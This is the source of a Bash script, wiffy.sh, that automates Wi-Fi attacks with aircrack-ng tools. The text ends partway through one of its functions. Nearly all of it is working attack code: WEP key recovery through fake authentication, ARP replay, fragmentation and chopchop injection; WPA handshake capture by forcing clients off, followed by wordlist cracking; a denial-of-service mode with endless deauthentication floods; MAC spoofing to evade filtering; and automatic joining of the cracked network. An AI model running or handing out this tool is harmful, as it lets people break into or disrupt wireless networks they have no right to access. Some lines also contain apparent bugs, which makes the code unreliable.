#!/bin/bash
#----------------------------------------------------------------------------------------------#
#wiffy.sh v0.1 (#25 2010-10-10)                                                                #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces to use
interface="wlan0"

# [crack/dos/inject] Crack - cracks WiFi Keys, dos - blocks access to ap, inject - MITM attack
mode="crack"

# [random/set/false] Change the MAC address
macMode="random"
fakeMac="00:05:7c:9a:58:3f"

# [/path/to/file] The wordlist used to brute force WPA keys
wordlist="/pentest/passwords/wordlists/wpa.txt"

# [true/false] Connect to network afterwords
connect="true"

# [true/false] Keep captured cap's. [/path/to/folder/] Where to store the CAP
keepCAP="true"
outputCAP="$(pwd)/caps/"

# [true/false] Test system performance at cracking WPA, attempts to generate ETA.
benchmark="true"

#---Variables----------------------------------------------------------------------------------#
       outputCAP="${outputCAP%/}" # Remove trailing slash
        timeScan="10"             # How long to scan for APs [Seconds] ~ Long the higher chance of detection
         timeWEP="15"             # How long to wait for WEP attacks (e.g. 15 Seconds)
         timeWPA="8"              # How long to wait for WPA attacks (e.g. 10 Seconds ~ 0=Forever!)
     diagnostics="false"          # Creates a output file displays exactly whats going on
         verbose="0"              # Shows more info. 0=normal, 1=more, 2=more+commands
           bssid=""               # null the value
           essid=""               # null the value
         channel=""               # null the value
          client=""               # null the value
     displayMore="false"          # Gives more details on whats happening
           debug="false"          # Windows don't close, shows extra stuff
         logFile="wiffy.log"      # Filename of output
             svn="29"             # SVN Number
         version="0.1 (#25)"      # Program version
trap 'interrupt break' 2          # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   if [ "$debug" == "true" ] ; then display diag "action~$@" ; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$diagnostics" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ] ; then command="$command | tee -a $logFile" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      if [ "$debug" == "true" ] ; then display diag "$xterm -geometry 100x$lines+$x+$y -T \"wiffy v$version - $1\" -e \"$command\"" ; fi
      $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile
      return 1
   fi
}
function attack() { #attack mode $essid $bssid #$mac
   if [ "$debug" == "true" ] ; then display diag "attack~$@" ; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      if [ "$1" == "FakeAuth" ] ; then
         display action "Attack ($1): $4"
         action "$1" "aireplay-ng --fakeauth 0 -e \"$2\" -a $3 -h $4 $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect '$essid'" 1>&2 ;
         elif grep -q "Association successful" "/tmp/wiffy.tmp" && [ "$displayMore" == "true" ] ; then display info "Attack ($1): Successfully association!" ; fi
         return 0
      elif [ "$1" == "ARPReplay" ] ; then
         display action "Attack ($1): $4"
         action "$1" "aireplay-ng --arpreplay -e \"$2\" -b $3 -h $4 $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
         sleep 1
         return 2
      elif [ "$1" == "DeAuth" ] ; then
         if [ "$4" ] ; then
            display action "Attack (DeAuth): $4"
            action "$1" "aireplay-ng --deauth 10 -e \"$2\" -a $3 -c $4 $monitorInterface" "true" "0|285|5"
         else
            display action "Attack (DeAuth): *everyone*"
            if [ "$stage" == "findClient" ] ; then action "$1" "aireplay-ng --deauth 5 -e \"$2\" -a $3 $monitorInterface" "true" "0|195|5" #Detecting Clients
            else action "$1" "aireplay-ng --deauth 10 -e \"$2\" -a $3 $monitorInterface" "true" "0|285|5" ; fi
         fi
         sleep 1
         return 3
      elif [ "$1" == "Fragment" ] ; then
         display action "Attack ($1): $4"
         action "$1" "aireplay-ng --fragment -b $3 -h $4 -m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (1)" 1>&2 ;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (2)" 1>&2 ;
         elif grep -q "Saving keystream in" "/tmp/wiffy.tmp" ; then
            if [ "$displayMore" == "true" ] ; then display info "Attack ($1): Success!" ; fi
            action "$1" "packetforge-ng -0 -a $3 -h $4 -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
            action "$1" "aireplay-ng --interactive -r /tmp/wiffy.arp -F $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
            sleep 1
         fi
         return 4
      elif [ "$1" == "ChopChop" ] ; then
         display action "Attack ($1): $4"
         action "$1" "aireplay-ng --chopchop -b $3 -h $4-m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (1)" 1>&2 ;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (2)" 1>&2 ;
         elif grep -q "--arpreplaySaving keystream in" "/tmp/wiffy.tmp" ; then
            if [ "$displayMore" == "true" ] ; then display info "Attack (ChopChop): Success!" ; fi
            action "$1" "packetforge-ng -0 -a $3 -h $4 -k 192.168.1.100 -l 192.168.1.1 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
            action "$1" "aireplay-ng --interactive -r /tmp/wiffy.arp -F $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
            sleep 1
         fi
         return 5
      elif [ "$1" == "Interactive" ] ; then
         display action "Attack ($1): $client"
         action "Interactive" "aireplay-ng --interactive -b $3 -c FF:FF:FF:FF:FF:FF -h $4 -T 1 -p 0841 -F $monitorInterface" "true" "0|195|5"
         return 6
      elif [ "$1" == "DoS" ] ; then
         if [ "$4" ] ; then
            if [ "$5" ] ; then xyl="0|$5|5"
            else xyl="0|0|10" ; fi
            display action "Attack (DeAuth): $4"
            action "$1" "aireplay-ng --deauth 0 -e \"$2\" -a $3 -c $4 $monitorInterface" "true" "$xyl"
         else
            display action "Attack (DeAuth): *everyone*"
            action "$1" "aireplay-ng --deauth 0 -e \"$2\" -a $3 $monitorInterface" "true" "0|0|13"
         fi
      else
         display error "attack. Wrong mode" 1>&2
         echo -e "---------------------------------------------------------------------------------------------\nERROR: attack (Wrong mode: $1): $1, $2, $3, $4" >> $logFile
         return 8
      fi
   else
      display error "attack Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: attack (Error code: $error): $1, $2, $3, $4" >> $logFile
      return 1
   fi
}
function attackWEP() { #attackWEP
   if [ "$debug" == "true" ] ; then display diag "attackWEP~$@" ; fi
   if [ "$client" == "clientless" ] && [ "$stage" == "findClient" ] ; then attack "FakeAuth" "$essid" "$bssid" "$mac" ; client="$mac" ; sleep 1 ; fi
   if [ "$stage" == "findClient" ] ; then attack "ARPReplay" "$essid" "$bssid" "$client" ; fi
   if [ "$stage" == "findClient" ] ; then attack "DeAuth" "$essid" "$bssid" "$client" ; fi
   if [ "$client" == "$mac" ] && [ "$stage" == "findClient" ] ; then sleep 8 ; if [ "$stage" == "findClient" ] ; then attack "FakeAuth" "$essid" "$bssid" "$client" ; fi ; fi
   if [ "$stage" == "findClient" ] ; then if [ "$displayMore" == "true" ] ; then display action "Waiting for IV's increase" ; fi ; sleep $timeWEP ; fi

   command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
   if [ "$command" -lt "100" ] && [ "$stage" == "findClient" ] ; then
      display error "Attack (ARPReplay): Failed" 1>&2
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
      if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
      attack "Fragment" "$essid" "$bssid" "$client"
      if [ "$stage" == "findClient" ] ; then if [ "$displayMore" == "true" ] ; then display action "Waiting for IV's increase" ; fi ; sleep $timeWEP ; fi
   else stage="done" ; return 1
   fi

   command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
   if [ "$command" -lt "100" ] && [ "$stage" == "findClient" ] ; then
      display error "Attack (Fragment): Failed" 1>&2
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
      if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
      attack "ChopChop" "$essid" "$bssid" "$client"
      if [ "$stage" == "findClient" ] ; then if [ "$displayMore" == "true" ] ; then display action "Waiting for IV's increase" ; fi ; sleep $timeWEP ; fi
   else stage="done" ; return 2
   fi

   command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
   if [ "$command" -lt "100" ] && [ "$stage" == "findClient" ] ; then display error "Attack (ChopChop): Failed" 1>&2
      display action "Attack (ChopChop): $client"
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
      if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
      attack "Interactive" "$essid" "$bssid" "$client"
      if [ "$stage" == "findClient" ] ; then if [ "$displayMore" == "true" ] ; then display action "Waiting for IV's increase" ; fi ; sleep $timeWEP ; fi
   else stage="done" ; return 3
   fi

   command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
   if [ "$command" -lt "100" ] ; then display error "Attack (Interactive): Failed" 1>&2 ; fi
   return 0
}
function attackWPA() { #attackWPA
   if [ "$debug" == "true" ] ; then display diag "attackWPA~$@" ; fi
   loop="0" # 0 = first, 1 = client, 2 = everyone
   echo "g0tmi1k" > /tmp/wiffy.tmp
   while [ "$stage" == "findClient" ] ; do
      action "aircrack-ng" "aircrack-ng /tmp/wiffy-01.cap -w /tmp/wiffy.tmp -e \"$essid\" | tee /tmp/wiffy.handshake" "true" "0|195|5"
      command=$(cat "/tmp/wiffy.handshake" | grep "Passphrase not in dictionary") ; if [ "$command" ] ; then stage="done" ; fi
      sleep 2
      if [ "$loop" != "1" ] && [ "$stage" == "findClient" ] ; then if [ "$loop" == "0" ] ; then display action "Capturing: Handshake" ; else findClient $encryption ; fi ; sleep 2 ; for targets in "${client[@]}" ; do attack "DeAuth" "$essid" "$bssid" "$targets" ; done ; loop="1" # Helping "kick", for idle client(s)
      elif [ "$stage" == "findClient" ] ; then attack "DeAuth" "$essid" "$bssid" ; loop="2" ; fi
      sleep 3
   done
   if [ "$displayMore" == "true" ] ; then display info "Captured: Handshake" ; fi
   action "Killing programs" "killall xterm && sleep 1"
   return 0
}
function benchmark() { #benchmark $essid
   if [ "$debug" == "true" ] ; then display diag "benchmark~$@" ; fi
   error="free"
   if [ -z "$1" ] ; then error="1" ; fi # Coding error
   if [ ! -e "$pathCAP" ] ; then error="2" ; fi

   if [ "$error" == "free" ] ; then
      display action "Starting: Benchmarking"
      wordlistLines=$(wc -l < "$wordlist")
      if [ "$wordlistLines" -lt "1000" ] ; then display error "Benchmarking: Failed. Not enough words in dictionary" 1>&2
      else
         action "Benchmarking" "aircrack-ng $pathCAP -w $wordlist -e \"$1\" > /tmp/wiffy.tmp & sleep 5 && killall xterm" # Hide it, dont show it!
         ks=$(cat "/tmp/wiffy.tmp" | grep "keys tested" | tail -1 | awk -F " " '{print $5}' | sed 's/.\(.*\)/\1/')
         rm -f "/tmp/wiffy.tmp"

         mins=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 60 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')
         hours=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 3600 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')
         command=$(date --date="$mins min")
         display info "Benchmark: ETA $command ~ $mins minutes ($hours hours) to try $wordlistLines words"
      fi
   else
      display error "benchmark Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: benchmark (Error code: $error): $1" >> $logFile
      return 1
   fi
}
function capture() { #capture $bssid $channel
   if [ "$debug" == "true" ] ; then display diag "capture~$@" ; fi
   error="free" ; stage="capture"
   if [ "$2" ] && [ ! $(echo "$2" | grep -E "^[0-9]+$") ] ; then error="2" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      if [ "$1" ] && [ "$2" ] ; then display action "Starting: airodump-ng" ;
      else display action "Scanning: Environment" ; fi
      command="rm -vf /tmp/wiffy-01* ; airodump-ng"
      if [ "$1" ] && [ "$2" ] ; then command="$command --bssid $1 --channel $2" ; fi
      command="$command --write /tmp/wiffy $monitorInterface"
      action "airodump-ng" "$command" "true" "0|0|13" & # Don't wait, do the next command
      sleep 1
      return 0
   else
      display error "capture Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: capture (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
}
function cleanUp() { #cleanUp #mode
   if [ "$debug" == "true" ] ; then display diag "cleanUp~$@" ; fi
   if [ "$1" == "nonuser" ] ; then exit 3 ;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      echo # Blank line
      if [ "$displayMore" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
      action "Killing xterm" "killall xterm aircrack-ng"
   fi

   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$displayMore" == "true" ] ; then display action "Restoring: Programs" ; fi
      command=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
      if [ "$command" ] ; then action "Monitor Mode (Stopping)" "airmon-ng stop $command" ; fi
      action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
   fi

   if [ "$debug" != "true" ] || [ "$1" == "remove" ] ; then
      if [ "$displayMore" == "true" ] ; then display action "Removing: Temp files" ; fi
      command="/tmp/wiffy*"
      tmp=$(ls replay_*.cap 2>/dev/null)
      if [ "$tmp" ] ; then command="$command replay_*.cap" ; fi
      tmp=$(ls fragment*.xor 2>/dev/null)
      if [ "$tmp" ] ; then command="$command fragment*.xor" ; fi
      tmp=$(ls /tmp/wiffy-*.cap 2>/dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy-*.cap" ; fi
      action "Removing temp files" "rm -rfv $command"
   fi

   if [ "$1" != "remove" ] ; then
      if [ "$diagnostics" == "true" ] ; then echo -e "End @ $(date)" >> $logFile ; fi
      echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
      exit 0
   fi
}
function connect() { #connect $essid $key #$key
   if [ "$debug" == "true" ] ; then display diag "connect~$@" ; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      if [ "$3" != "$mac" ] && [ "$3" ] ; then
         if [ "$displayMore" == "true" ] ; then display action "Attack (Spoofing): $3 ('Helps' with MAC filtering) " ; fi
         action "Spoofing MAC" "ifconfig $interface down ; macchanger -m $3 $interface ; ifconfig $interface up"
      fi
      display action "Joining: $1"
      action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
      if [ "$encryption" == "WEP" ] ; then
         action "i[f/w]config" "ifconfig $interface down ; iwconfig $interface essid $1 key $2 ; ifconfig $interface up"
      elif [[ "$encryption" == *WPA* ]] ; then
         action "WPA" "wpa_passphrase $1 '$2' > /tmp/wiffy.tmp && wpa_supplicant -B -i$interface -c/tmp/wiffy.tmp -Dwext"
         cp -f "/tmp/wiffy.tmp" "wpa.conf"
      fi
      sleep 5
      action "dhclient" "dhclient $interface"
      ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      if [ "$ourIP" ] ; then if [ "$displayMore" == "true" ] ; then display info "IP: $ourIP" ; fi ; display action "Connected!" ; stage="connected";
      else display error "Failed to get an IP address!" 1>&2 ; fi
      #gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
      #display info "Gateway: $gateway"
   else
      display error "connect Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: connect (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
}
function display() { #display type message
   if [ "$debug" == "true" ] ; then display diag "display~$@" ; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ] ; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ] ; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ] ; then output="\e[01;31m[!]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]"
         elif [ "$1" == "info" ] ; then output="[i]"
         elif [ "$1" == "diag" ] ; then output="[+]"
         elif [ "$1" == "error" ] ; then output="[!]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
}
function findAP() { #findAP
   if [ "$debug" == "true" ] ; then display diag "findAP~$@" ; fi
   while true ; do
      capture && sleep $timeScan && killall airodump-ng
      index="-1" # so its starts at 0
      id="" # For -e or -b
      while IFS='<>' read _ starttag value endtag; do
         case "$starttag" in
            encryption)                 index=$(($index+1)) ; arrayEnc[$index]="$value" ;;
            BSSID)                      arrayClients[$index]="0" ; arrayBSSID[$index]="$value" ; if [ "$bssid" ] && [ "$bssid" == "$value" ] ; then id="$index" ; fi ;;
            "essid cloaked=\"false\"")  arrayESSID[$index]="$value" ; arrayHidden[$index]="false" ; if [ "$essid" ] && [ "$essid" == "$value" ] ; then id="$index" ; fi ;;
            "essid cloaked=\"true\"")   arrayESSID[$index]="$value" ; arrayHidden[$index]="true"  ;;
            channel)                    arrayChannel[$index]="$value" ;;
            last_signal_dbm)            arraySignal[$index]="$value" ;;
            client-mac)                 arrayClients[$index]=$((arrayClients[$index]+1)) ;;
            manuf)                      arrayManuf[$index]="$value" ;; #"needed"?
         esac
      done < /tmp/wiffy-01.kismet.netxml
      loop=${#arrayBSSID[@]}
      for (( i=0;i<$loop;i++)); do
         if [[ ${arrayEnc[${i}]} == *WPA2* ]] ; then arrayEnc[${i}]="WPA2"
         elif [[ ${arrayEnc[${i}]} == *WPA* ]] ; then arrayEnc[${i}]="WPA"
         elif [[ ${arrayEnc[${i}]} == *WEP* ]] ; then arrayEnc[${i}]="WEP"
         elif [[ ${arrayEnc[${i}]} == *OPN* ]] ; then arrayEnc[${i}]="Off"
         else arrayEnc[${i}]="???" ; fi
      done

      if [ "$id" ] ; then break # break loop, found AP!
      else
         stage="menu"
         if [ "$essid" ] ; then display error "Couldn't detect ESSID ($essid)" 1>&2 ; fi
         if [ "$bssid" ] ; then display error "Couldn't detect BSSID ($bssid)" 1>&2 ; fi
         echo -e " Num |              ESSID               |       BSSID       | Encr | Cha | Signal | Clients | Manufacture\n-----|----------------------------------|-------------------|------|-----|--------|---------|-------------"
         for (( i=0;i<$loop;i++)); do
            command="  %-2s | %-32s | %-16s |"
            if [[ ${arrayEnc[${i}]} == "WPA2" ]] ; then command="$command \e[01;34m%-4s\e[00m |"
            elif [[ ${arrayEnc[${i}]} == "WPA" ]] ; then command="$command \e[01;34m%-4s\e[00m |"
            elif [[ ${arrayEnc[${i}]} == "WEP" ]] ; then command="$command \e[01;36m%-4s\e[00m |"
            elif [[ ${arrayEnc[${i}]} == "OPN" ]] ; then command="$command \e[01;33m%-4s\e[00m |"
            else command="$command \e[01;31m%-4s\e[00m |" ; fi

            if [ ${arrayChannel[${i}]} -gt "14" ] ; then command="$command \e[01;31m%-3s\e[00m |" # Out of range!
            elif [ ${arrayChannel[${i}]} -gt "11" ] ; then command="$command \e[01;33m%-3s\e[00m |" # Out of USA range!
            elif [ ${arrayChannel[${i}]} -lt "0" ] ; then command="$command \e[01;31m%-3s\e[00m |" # Out of range
            else command="$command %-3s |" ; fi

            if [ ${arraySignal[${i}]} == "0" ] ; then command="$command  \e[01;31m%-5s\e[00m |" # error
            elif [ ${arraySignal[${i}]} -lt "-85" ] ; then command="$command  \e[01;31m%-5s\e[00m |" # Low
            elif [ ${arraySignal[${i}]} -lt "-65" ] ; then command="$command  \e[01;33m%-5s\e[00m |" # Mid
            else command="$command  \e[01;32m%-5s\e[00m |"  ; fi # High

            if [ ${arrayClients[${i}]} == "0" ] && [[ ${arrayEnc[${i}]} == *WPA* ]] ; then command="$command    \e[01;33m%-4s\e[00m |" # Out of range!
            else command="$command    %-4s |" ; fi

            command="$command %-10s\n"

            printf "$command" "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayEnc[${i}]}" "${arrayChannel[${i}]}" "${arraySignal[${i}]}" "${arrayClients[${i}]}" "${arrayManuf[${i}]}"
         done

         while true ; do
            read -p "[~] re[s]can, e[x]it or select num: "
            if [ "$REPLY" == "x" ] ; then cleanUp clean
            #elif [ "$REPLY" == "a" ] ; then mode="all" ; loopSelect="true" ; loopSearch="true"
            elif [ "$REPLY" == "s" ] ; then break ;
            elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
            elif [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$loop" ] ; then display error "Incorrect number" 1>&2
            else id="$(($REPLY-1))" ; break 2 ; fi
         done
      fi
   done
   if [ "$mode" == "all" ] ; then
      essid=("${arrayESSID[@]}")
      bssid=("${arrayBSSID[@]}")
      channel=("${arrayChannel[@]}")
      encryption=("${arrayEnc[@]}")
   else
      essid="${arrayESSID[$id]}"
      bssid="${arrayBSSID[$id]}"
      channel="${arrayChannel[$id]}"
      encryption="${arrayEnc[$id]}"
   fi
   client=""
   if [ "$diagnostics" == "true" ] ; then
      echo "            essid=$essid
               bssid=$bssid
          encryption=$encryption
             channel=$channel" >> $logFile
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
       display info "           essid=$essid
\e[01;33m[i]\e[00m            bssid=$bssid
\e[01;33m[i]\e[00m       encryption=$encryption
\e[01;33m[i]\e[00m          channel=$channel"
   fi
   stage="findAP"
}
function findClient() { #findClient $encryption
   if [ "$debug" == "true" ] ; then display diag "findClient~$@" ; fi
   stage="findClient"
   if [ -z "$1" ] && [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      display action "Detecting: Client(s)"
      client=""
      while [ ! -e "/tmp/wiffy-01.kismet.netxml" ] ; do sleep 1 ; done
      attack "DeAuth" "$essid" "$bssid" # Helping "kick", for idle client(s)
      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then # N/A = For MAC filtering
         sleep $timeWEP
         client=( $(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') )
      elif [[ "$1" == *WPA* ]] ; then
         if [ "$timeWPA" == "0" ] ; then while [ -z "$client" ] ; do client=( $(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') ) ; done
         else for ((i=0;i<$timeWPA;i++)); do client=( $(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') ) ; sleep 1 ; if [ -n "$client" ] ; then i=$timeWPA ; fi ; done ; fi
      fi

      if [ "$client" == "" ] && [ "$stage" == "findClient" ] ; then
         if [[ "$1" == *WPA* ]] && [ "$mode" != "dos" ] ; then display error "Timed out. Didn't find a connected client to '$essid'. Try increasing \"timeWPA\"." 1>&2 ; interrupt ; fi
         client="clientless"
      fi

      if [ -z "$essid" ] ; then
         essid=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
         if [ "$displayMore" == "true" ] ; then display info "*hidden* ESSID=$essid" ; fi
      fi

      if [ "$displayMore" == "true" ] ; then for targets in "${client[@]}" ; do display info "client=$targets" ; done ; fi
      return 0
   else
      display error "findClient. Error code: $error" 1>&2
      return 1
   fi
}
function help() { #help
   if [ "$debug" == "true" ] ; then display diag "help~$@" ; fi
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [interface] -m [crack/dos/inject] -e [essid] -b [mac] -c [mac]
               -w [/path/to/file] (-z [random/set/false] / -s [mac]) -x -k -o [/path/to/folder/] -d (-v / -V) ([-u] [-?])


 Options:
   -i [interface]         ---  Internet Interface e.g. $interface
   -t [interface]         ---  Monitor Interface  e.g. $monitorInterface

   -m [crack/dos/inject]  ---  Mode. e.g. $mode

   -e [ESSID]             ---  ESSID (WiFi Name) e.g. Linksys
   -b [MAC]               ---  BSSID (AP MAC Address) e.g. 01:23:45:67:89:AB
   -c [MAC]               ---  Client's Mac Address e.g. FE:DC:BA:98:76:54

   -w [/path/to/file]     ---  Path to Wordlist e.g. $wordlist

   -z [random/set/false]  ---  Change interface's MAC Address e.g. $macMode
   -s [MAC]               ---  Use this MAC Address e.g. $fakeMac

   -x                     ---  Connect to network afterwords

   -k                     ---  Keep capture cap files
   -o [/path/to/folder/]  ---  Output folder for the cap files

   -d                     ---  Diagnostics      (Creates output file, $logFile)
   -v                     ---  Verbose          (Displays more)
   -V                     ---  (Higher) Verbose (Displays more + shows commands)

   -u                     ---  Checks for an update
   -?                     ---  This screen


 Example:
   bash wiffy.sh
   bash wiffy.sh -i wlan1 -e Linksys -w /pentest/passwords/wordlists/wpa.lst -x -v
   bash wiffy.sh -m dos -V


 Known issues:
    -WEP
       > Didn't detect my client
          + Add it in manually
          + Re-run the script
       > IV's doesn't increae
          + DeAuth didn't work --- Client using Windows 7?
          + Use a different router/client

    -WPA
       > You can ONLY crack WPA when:
          + The ESSID is known
          + The WiFi key is in the word-list
          + There is a connected client

    -Doesn't detect any/my wireless network
       > Don't run from a virtual machine
       > Driver issue - Use a different WiFi device
       > Re-run the script
       > Unplug WiFi device, wait, replug
       > You're too close/far away

    -\"connect\" doesn't work
       > Network doesn't have a DHCP server

    -Slow
       > Try a different attack... manually!
"
   exit 1
}
function interrupt() { #interrupt
   if [ "$mode" == "crack" ] && [ "$stage" != "setup" ] && [ "$stage" != "menu" ] && [ "$stage" != "done" ] ; then
      echo #Blank line
      read -p "[~] select [a]nother network or anything else to exit: "
      if [[ "$REPLY" =~ ^[Aa]$ ]] ; then action "Restarting" "killall xterm" ; essid="" ; bssid="" ; id="" ; client="" ; break # reset
      else cleanUp interrupt ; fi # Default
   else
      cleanUp interrupt
   fi
}
function moveCap() { #moveCap $essid
   if [ "$debug" == "true" ] ; then display diag "smoveCap~$@" ; fi
   error="free"
   if [ -z "$1" ] ; then error="1" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      command=""
      if [ "$keepCAP" == "true" ] && [[ "$encryption" == *WPA* ]] ; then
         if [ ! -e "$pathCAP" ] ; then command="mkdir $outputCAP ;" ; fi
         pathCAP="$outputCAP/$1.cap"
      else pathCAP="/tmp/wiffy-$1.cap" ; fi
      display action "Moving handshake: $pathCAP"
      command="$command mv -f /tmp/wiffy-01.cap $pathCAP"
      action "Moving handshake" "$command"
      return 0
   else
      display error "moveCap Error code: $error"
